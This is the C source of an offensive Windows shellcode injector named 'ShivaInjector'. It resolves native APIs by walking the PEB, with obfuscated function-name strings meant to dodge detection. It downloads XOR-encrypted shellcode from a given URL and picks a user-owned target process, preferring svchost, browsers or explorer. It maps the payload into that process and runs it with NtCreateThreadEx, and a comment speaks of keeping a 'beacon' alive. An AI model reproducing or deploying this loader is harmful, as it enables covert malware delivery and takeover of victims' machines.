#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "ShivaInjector.h"

// == Utility ==
PVOID NtGetCurrentHeap() {
#ifdef _M_X64
    PVOID peb = (PVOID)__readgsqword(0x60);
    return *(PVOID*)((PBYTE)peb + 0x30);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
    return *(PVOID*)((PBYTE)peb + 0x18);
#endif
}

PPEB NtGetPEB() {
#ifdef _M_X64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

void InitUnicodeString(UNICODE_STRING* dst, PCWSTR src) {
    if ((dst->Buffer = (PWSTR)src)) {
        dst->Length = min((USHORT)(wcslen(src) * sizeof(WCHAR)), 0xfffc);
        dst->MaximumLength = dst->Length + sizeof(WCHAR);
    }
    else {
        dst->Length = dst->MaximumLength = 0;
    }
}

HMODULE NtGetModuleHandleReverse(LPCWSTR moduleName) {
    PPEB peb = NtGetPEB();
    PLIST_ENTRY list = peb->Ldr->InMemoryOrderModuleList.Blink;
    while (list != &peb->Ldr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0)
            return (HMODULE)entry->DllBase;
        list = list->Blink;
    }
    return NULL;
}

FARPROC NtGetProcAddressReverse(HMODULE moduleBase, LPCSTR funcName) {
    PBYTE base = (PBYTE)moduleBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + rva);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = exports->NumberOfNames; i > 0; i--) {
        LPCSTR name = (LPCSTR)(base + names[i]);
        if (strcmp(name, funcName) == 0)
            return (FARPROC)(base + functions[ordinals[i]]);
    }
    return NULL;
}

BOOL CheckEqualSid(PSID sid1, PSID sid2) {
    if (!sid1 || !sid2) return FALSE;

    PISID s1 = (PISID)sid1;
    PISID s2 = (PISID)sid2;

    if (s1->Revision != s2->Revision) return FALSE;
    if (s1->SubAuthorityCount != s2->SubAuthorityCount) return FALSE;

    if (memcmp(&s1->IdentifierAuthority,
        &s2->IdentifierAuthority,
        sizeof(SID_IDENTIFIER_AUTHORITY)) != 0) return FALSE;

    for (BYTE i = 0; i < s1->SubAuthorityCount; i++) {
        if (s1->SubAuthority[i] != s2->SubAuthority[i]) return FALSE;
    }

    return TRUE;
}

// == Build Instance ==
void InitInstance(_Out_ PINSTANCE pInstance) {
    // Ntdll
    WCHAR wNtdll[] = L"ntdll.dll";

    CHAR cRtlAllocateHeap[] = { 'R','t','l','A','l','l','o','c','a','t','e','H','e','a','p',0 };
    CHAR cRtlReAllocateHeap[] = { 'R','t','l','R','e','A','l','l','o','c','a','t','e','H','e','a','p',0 };
    CHAR cRtlFreeHeap[] = { 'R','t','l','F','r','e','e','H','e','a','p',0 };

    CHAR cNtCreateSection[] = { 'N','t','C','r','e','a','t','e','S','e','c','t','i','o','n',0 };
    CHAR cNtMapViewOfSection[] = { 'N','t','M','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n',0 };
    CHAR cNtUnmapViewOfSection[] = { 'N','t','U','n','m','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n',0 };

    CHAR cRtlCreateProcessParametersEx[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','P','a','r','a','m','e','t','e','r','s','E','x',0 };
    CHAR cNtCreateUserProcess[] = { 'N','t','C','r','e','a','t','e','U','s','e','r','P','r','o','c','e','s','s',0 };

    CHAR cNtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };

    CHAR cLdrLoadDll[] = { 'L','d','r','L','o','a','d','D','l','l',0 };
    CHAR cLdrUnloadDll[] = { 'L','d','r','U','n','l','o','a','d','D','l','l',0 };

    CHAR cNtQueryInformationProcess[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s',0 };

    CHAR cNtClose[] = { 'N','t','C','l','o','s','e',0 };
    CHAR cNtQuerySystemInformation[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
    CHAR cNtOpenProcess[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
    CHAR cNtOpenProcessToken[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0 };
    CHAR cNtQueryInformationToken[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','T','o','k','e','n',0 };

    pInstance->Modules.Ntdll = NtGetModuleHandleReverse(wNtdll);

    pInstance->Api.RtlAllocateHeap = (fnRtlAllocateHeap)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cRtlAllocateHeap);
    pInstance->Api.RtlReAllocateHeap = (fnRtlReAllocateHeap)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cRtlReAllocateHeap);
    pInstance->Api.RtlFreeHeap = (fnRtlFreeHeap)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cRtlFreeHeap);

    pInstance->Api.NtCreateSection = (fnNtCreateSection)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtCreateSection);
    pInstance->Api.NtMapViewOfSection = (fnNtMapViewOfSection)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtMapViewOfSection);
    pInstance->Api.NtUnmapViewOfSection = (fnNtUnmapViewOfSection)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtUnmapViewOfSection);

    pInstance->Api.RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cRtlCreateProcessParametersEx);
    pInstance->Api.NtCreateUserProcess = (fnNtCreateUserProcess)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtCreateUserProcess);
    pInstance->Api.NtCreateThreadEx = (fnNtCreateThreadEx)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtCreateThreadEx);

    pInstance->Api.LdrLoadDll = (fnLdrLoadDll)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cLdrLoadDll);
    pInstance->Api.LdrUnloadDll = (fnLdrUnloadDll)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cLdrUnloadDll);

    pInstance->Api.NtQueryInformationProcess = (fnNtQueryInformationProcess)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtQueryInformationProcess);

    pInstance->Api.NtClose = (fnNtClose)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtClose);
    pInstance->Api.NtQuerySystemInformation = (fnNtQuerySystemInformation)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtQuerySystemInformation);
    pInstance->Api.NtOpenProcess = (fnNtOpenProcess)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtOpenProcess);
    pInstance->Api.NtOpenProcessToken = (fnNtOpenProcessToken)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtOpenProcessToken);
    pInstance->Api.NtQueryInformationToken = (fnNtQueryInformationToken)NtGetProcAddressReverse(pInstance->Modules.Ntdll, cNtQueryInformationToken);

    // WinHttp
    CHAR cWinHttpOpen[] = { 'W','i','n','H','t','t','p','O','p','e','n',0 };
    CHAR cWinHttpConnect[] = { 'W','i','n','H','t','t','p','C','o','n','n','e','c','t',0 };
    CHAR cWinHttpOpenRequest[] = { 'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t',0 };
    CHAR cWinHttpReadData[] = { 'W','i','n','H','t','t','p','R','e','a','d','D','a','t','a',0 };
    CHAR cWinHttpReceiveResponse[] = { 'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p','o','n','s','e',0 };
    CHAR cWinHttpSendRequest[] = { 'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t',0 };
    CHAR cWinHttpQueryHeaders[] = { 'W','i','n','H','t','t','p','Q','u','e','r','y','H','e','a','d','e','r','s',0 };
    CHAR cWinHttpCloseHandle[] = { 'W','i','n','H','t','t','p','C','l','o','s','e','H','a','n','d','l','e',0 };
    CHAR cWinHttpCrackUrl[] = { 'W','i','n','H','t','t','p','C','r','a','c','k','U','r','l',0 };

    UNICODE_STRING uHttp; InitUnicodeString(&uHttp, L"winhttp.dll");
    HMODULE hWinHttp = NULL;
    pInstance->Api.LdrLoadDll(NULL, 0, &uHttp, &pInstance->Modules.WinHttp);

    pInstance->Api.WinHttpOpen = (fnWinHttpOpen)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpOpen);
    pInstance->Api.WinHttpConnect = (fnWinHttpConnect)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpConnect);
    pInstance->Api.WinHttpOpenRequest = (fnWinHttpOpenRequest)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpOpenRequest);
    pInstance->Api.WinHttpReadData = (fnWinHttpReadData)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpReadData);
    pInstance->Api.WinHttpReceiveResponse = (fnWinHttpReceiveResponse)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpReceiveResponse);
    pInstance->Api.WinHttpSendRequest = (fnWinHttpSendRequest)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpSendRequest);
    pInstance->Api.WinHttpCloseHandle = (fnWinHttpCloseHandle)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpCloseHandle);
    pInstance->Api.WinHttpCrackUrl = (fnWinHttpCrackUrl)NtGetProcAddressReverse(pInstance->Modules.WinHttp, cWinHttpCrackUrl);
}

// == Argument Parsing ==
bool ParseArgs(int argc, char* argv[], char* urlOut, size_t urlSize, _Out_ char* xorKeyOut, size_t xorKeySize, DWORD* pidOut) {
    urlOut[0] = xorKeyOut[0] = '\0';
    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "/p:", 3) == 0)
            strncpy_s(urlOut, urlSize, argv[i] + 3, _TRUNCATE);
        else if (strncmp(argv[i], "/x:", 3) == 0)
            strncpy_s(xorKeyOut, xorKeySize, argv[i] + 3, _TRUNCATE);
        else if (strncmp(argv[i], "/pid:", 5) == 0) {
            *pidOut = (DWORD)strtoul(argv[i] + 5, NULL, 10);
        }
    }
    return (urlOut[0] != '\0');
}

// == Shellcode XOR ==
bool XorDecrypt(PBYTE data, DWORD size, const char* key) {
    size_t klen = strlen(key);
    if (!klen) return false;
    for (DWORD i = 0; i < size; i++) data[i] ^= key[i % klen];
    return true;
}

// == HTTP Downloader ==
bool DownloadBuffer(_In_ INSTANCE Instance, _In_ const char* url, PBYTE buffer, DWORD* outSize) {
    WCHAR wUrl[2084] = { 0 }; MultiByteToWideChar(CP_ACP, 0, url, -1, wUrl, 2084);
    URL_COMPONENTS uc = { sizeof(uc) }; WCHAR host[256], path[1024];
    uc.lpszHostName = host; uc.dwHostNameLength = ARRAYSIZE(host);
    uc.lpszUrlPath = path; uc.dwUrlPathLength = ARRAYSIZE(path);
    if (!Instance.Api.WinHttpCrackUrl(wUrl, 0, 0, &uc)) return false;

    HINTERNET hSession = Instance.Api.WinHttpOpen(L"Shiva/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = Instance.Api.WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    DWORD flags = WINHTTP_FLAG_REFRESH | (uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    HINTERNET hRequest = Instance.Api.WinHttpOpenRequest(hConnect, L"GET", uc.lpszUrlPath, NULL, NULL, NULL, flags);
    if (!Instance.Api.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) || !Instance.Api.WinHttpReceiveResponse(hRequest, NULL)) return false;

    DWORD total = 0, read = 0;
    while (total < MAX_SHELLCODE_SIZE && Instance.Api.WinHttpReadData(hRequest, buffer + total, MAX_SHELLCODE_SIZE - total, &read) && read > 0)
        total += read;
    *outSize = total;

    Instance.Api.WinHttpCloseHandle(hRequest); Instance.Api.WinHttpCloseHandle(hConnect); Instance.Api.WinHttpCloseHandle(hSession);
    Instance.Api.LdrUnloadDll(Instance.Modules.WinHttp);
    return total > 0;
}

// == Identify injectable processes ==
static BOOL GetCurrentUserSID(INSTANCE Instance, PSID* ppSid) {
    HANDLE hToken = NULL;
    // use pseudo-handle for current process: (HANDLE)-1
    NTSTATUS status = Instance.Api.NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status)) return FALSE;

    ULONG need = 0;
    // First query to get required size
    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &need);
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_INVALID_PARAMETER) {
        // on some Windows variants the call returns STATUS_BUFFER_TOO_SMALL; treat other as error
        Instance.Api.NtClose(hToken);
        return FALSE;
    }

    PTOKEN_USER ptu = (PTOKEN_USER)malloc(need);
    if (!ptu) { Instance.Api.NtClose(hToken); return FALSE; }

    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, ptu, need, &need);
    if (!NT_SUCCESS(status)) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        return FALSE;
    }

    DWORD sidLen = GetLengthSid(ptu->User.Sid);
    PSID sidCopy = malloc(sidLen);
    if (!sidCopy) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        return FALSE;
    }
    memcpy(sidCopy, ptu->User.Sid, sidLen);

    free(ptu);
    Instance.Api.NtClose(hToken);

    *ppSid = sidCopy;
    return TRUE;
}

static BOOL IsProcessOwnedByUser(INSTANCE Instance, DWORD pid, PSID currentSid) {
    HANDLE hProcess = NULL;
    CLIENT_ID cid{};
    cid.UniqueProcess = (PVOID)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    NTSTATUS status = Instance.Api.NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
    if (!NT_SUCCESS(status) || hProcess == NULL) {
        // couldn't open -> treat as not-owned
        return FALSE;
    }

    // Open the token for the process
    HANDLE hToken = NULL;
    status = Instance.Api.NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status) || !hToken) {
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    // Query TokenUser size
    ULONG need = 0;
    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &need);
    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_INVALID_PARAMETER) {
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    PTOKEN_USER ptu = (PTOKEN_USER)malloc(need);
    if (!ptu) {
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    status = Instance.Api.NtQueryInformationToken(hToken, TokenUser, ptu, need, &need);
    if (!NT_SUCCESS(status)) {
        free(ptu);
        Instance.Api.NtClose(hToken);
        Instance.Api.NtClose(hProcess);
        return FALSE;
    }

    BOOL match = CheckEqualSid(currentSid, ptu->User.Sid) ? TRUE : FALSE;

    free(ptu);
    Instance.Api.NtClose(hToken);
    Instance.Api.NtClose(hProcess);
    return match;
}

int EnumerateProcessesForCurrentUser(INSTANCE Instance, PF_PROCESS_ENTRY** outList) {
    PSID currentSid = NULL;
    if (!GetCurrentUserSID(Instance, &currentSid)) return 0;

    ULONG bufSize = 1 << 16; // 64KB start
    PVOID buffer = NULL;
    NTSTATUS status;
    ULONG returnLen = 0;

    // grow until success
    for (;;) {
        if (buffer) { Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer); buffer = NULL; }
        buffer = Instance.Api.RtlAllocateHeap(NtGetCurrentHeap(), HEAP_ZERO_MEMORY, bufSize);
        if (!buffer) { free(currentSid); return 0; }

        status = Instance.Api.NtQuerySystemInformation(SystemProcessInformation, buffer, bufSize, &returnLen);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
            continue;
        }
        if (!NT_SUCCESS(status)) {
            Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer);
            free(currentSid);
            return 0;
        }
        break;
    }

    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    size_t capacity = PF_INITIAL_CAP;
    PF_PROCESS_ENTRY* list = (PF_PROCESS_ENTRY*)malloc(capacity * sizeof(PF_PROCESS_ENTRY));
    if (!list) { Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer); free(currentSid); return 0; }
    size_t count = 0;

    while (TRUE) {
        if (spi->UniqueProcessId != 0) {
            DWORD pid = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
            // check owner
            if (IsProcessOwnedByUser(Instance, pid, currentSid)) {
                if (count >= capacity) {
                    size_t nc = capacity * 2;
                    PF_PROCESS_ENTRY* tmp = (PF_PROCESS_ENTRY*)realloc(list, nc * sizeof(PF_PROCESS_ENTRY));
                    if (!tmp) break;
                    list = tmp;
                    capacity = nc;
                }
                list[count].pid = pid;
                if (spi->ImageName.Buffer && spi->ImageName.Length) {
                    // ImageName.Length is bytes
                    int nchars = (int)(spi->ImageName.Length / sizeof(WCHAR));
                    int tocopy = (nchars < (PF_NAME_LEN - 1)) ? nchars : (PF_NAME_LEN - 1);
                    wcsncpy_s(list[count].name, PF_NAME_LEN, spi->ImageName.Buffer, tocopy);
                    list[count].name[tocopy] = L'\0';
                }
                else {
                    // fallback
                    wcsncpy_s(list[count].name, PF_NAME_LEN, L"(unknown)", _TRUNCATE);
                }
                count++;
            }
        }

        if (spi->NextEntryOffset == 0) break;
        spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
    }

    Instance.Api.RtlFreeHeap(NtGetCurrentHeap(), 0, buffer);
    free(currentSid);

    *outList = list;
    return (int)count;
}

HANDLE FindInjectableProcess(INSTANCE Instance, DWORD* outPid, const WCHAR* preferred[], int preferredCount) {
    PF_PROCESS_ENTRY* list = NULL;
    int count = EnumerateProcessesForCurrentUser(Instance, &list);
    if (count <= 0) {
        if (list) free(list);
        return NULL;
    }

    HANDLE hResult = NULL;
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    for (int i = 0; i < count && !hResult; i++) {
        for (int p = 0; p < preferredCount && !hResult; p++) {
            if (_wcsicmp(list[i].name, preferred[p]) == 0) {
                CLIENT_ID cid;
                cid.UniqueProcess = (PVOID)(ULONG_PTR)list[i].pid;
                cid.UniqueThread = NULL;
                HANDLE hProcess = NULL;
                NTSTATUS status = Instance.Api.NtOpenProcess(&hProcess, INJECTION_DESIRED_ACCESS, &oa, &cid);
                if (NT_SUCCESS(status) && hProcess) {
                    // success
                    hResult = hProcess;
                    *outPid = list[i].pid;
                    break;
                }
            }
        }
    }

    free(list);
    return hResult;
}

// -- MapShellcodeToTarget --
void* MapShellcodeToTarget(INSTANCE Instance, HANDLE hProc, PVOID* remoteOut, PBYTE payload, DWORD size, char* xorKey) {
    LARGE_INTEGER maxSize{};
    maxSize.QuadPart = size;
    HANDLE hSection = NULL;
    if (Instance.Api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != 0) return NULL;

    PVOID local = NULL; SIZE_T viewSize = 0;
    if (Instance.Api.NtMapViewOfSection(hSection, NtCurrentProcess(), &local, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE) != 0) return NULL;
    if (xorKey[0] && !XorDecrypt(payload, size, xorKey)) return NULL;
    memcpy(local, payload, size);

    PVOID remote = NULL; SIZE_T remoteSize = 0;
    if (Instance.Api.NtMapViewOfSection(hSection, hProc, &remote, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ) != 0) return NULL;
    Instance.Api.NtUnmapViewOfSection(NtCurrentProcess(), local);
    *remoteOut = remote;
    return hSection;
}

// -- CreateThreadInTarget --
bool CreateThreadInTarget(INSTANCE Instance, HANDLE hProcess, PVOID remoteSectionAddress) {
    PVOID hRemoteThread = NULL;
    NTSTATUS status = Instance.Api.NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteSectionAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0 || hRemoteThread == NULL) {
        printf("[-] NtCreateThreadEx failed: 0x%X\n", status);
        return 1;
    }
    return 1;
}

// == Main ==
int main(int argc, char* argv[]) {
    char url[MAX_URL_LENGTH], xorKey[MAX_XOR_KEY_LENGTH];
    DWORD pid = 0;
    NTSTATUS status;
    INSTANCE Instance = { 0 };
    if (!ParseArgs(argc, argv, url, sizeof(url), xorKey, sizeof(xorKey), &pid)) {
        printf("Usage: %s /p:<url> [/x:<xorkey>] [/pid:<procid>]\n", argv[0]); return 1;
    }

    InitInstance(&Instance);

    BYTE* shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (shellcode == NULL) return 1;
    memset(shellcode, 0, MAX_SHELLCODE_SIZE);
    DWORD shellcodeSize = 0, textSize = 0;

    if (!DownloadBuffer(Instance, url, shellcode, &shellcodeSize)) return 1;

    // List of preferred targets, for sorting
    // See https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_kerberoasting_unusual_process
    // Remember that if the process is closed by the system or user it will kill your beacon.
    const WCHAR* targets[] = {
        L"svchost.exe",
        L"MicrosoftEdge.exe",
        L"msedge.exe",
        L"MicrosoftEdgeUpdate.exe",
        L"chrome.exe",
        L"firefox.exe",
        L"RuntimeBroker.exe",
        L"wsmprovhost.exe", // The only process we can inject into if connected with winrm
        L"notepad.exe",     // TODO: Remove this
        L"explorer.exe"
    };

    // Validate PID, or find processes that are injectable by the current user.
    HANDLE hProcess = NULL;
    bool pidInput = (pid != 0);
    switch (pid) {
    case 0:
        printf("[+] Checking for injectable processes\n");
        hProcess = FindInjectableProcess(Instance, &pid, targets, sizeof(targets) / sizeof(targets[0]));
        if (hProcess) {
            printf("[+] Found target PID %u (handle 0x%p)\n", pid, hProcess);
        }
        else {
            printf("[-] No target found\n");
        }
        break;
    default:
        printf("[+] Verifying permissions on %d\n", pid);
        OBJECT_ATTRIBUTES oa{};
        CLIENT_ID cid{};
        cid.UniqueProcess = (PVOID)(ULONG_PTR)pid;
        cid.UniqueThread = NULL;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        status = Instance.Api.NtOpenProcess(&hProcess, INJECTION_DESIRED_ACCESS, &oa, &cid);
        if (!NT_SUCCESS(status) || !hProcess) {
            printf("[-] Failed to get handle to PID: %d, Status: 0x%X", pid, status);
            return 1;
        }
        break;
    }

    // Create section and map it to target process
    PVOID remoteSectionAddress = NULL;
    MapShellcodeToTarget(Instance, hProcess, &remoteSectionAddress, shellcode, shellcodeSize, xorKey);
    printf("[+] Shellcode mapped at %p\n", remoteSectionAddress);

    // Create thread
    if (CreateThreadInTarget(Instance, hProcess, remoteSectionAddress)) return 1;
    printf("[+] NtCreateThreadEx thread started at %p\n", remoteSectionAddress);
    free(shellcode);
    return 0;
}
